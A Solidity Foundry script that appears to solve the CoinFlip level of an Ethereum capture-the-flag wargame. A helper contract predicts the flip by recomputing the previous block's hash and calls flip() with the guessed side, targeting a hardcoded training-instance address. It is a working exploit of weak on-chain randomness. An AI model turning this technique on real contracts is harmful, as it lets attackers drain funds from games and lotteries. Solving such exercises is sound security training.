// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/levels/03-CoinFlip/CoinFlip.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract Player {
    uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    constructor(CoinFlip _coinFilpInstance){
        uint256 blockValue = uint256(blockhash(block.number -1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        _coinFilpInstance.flip(side);
    }
}

contract Level03Solution is Script {
    CoinFlip level03 = CoinFlip(address(0xC05abCf1099078Ff64bbF75f27B6CC6311bBaAE6));

    function run() external {
        vm.startBroadcast();
        
        new Player(level03);
        console.log("consecutiveWins : ", level03.consecutiveWins());
        
        vm.stopBroadcast();
    }
}

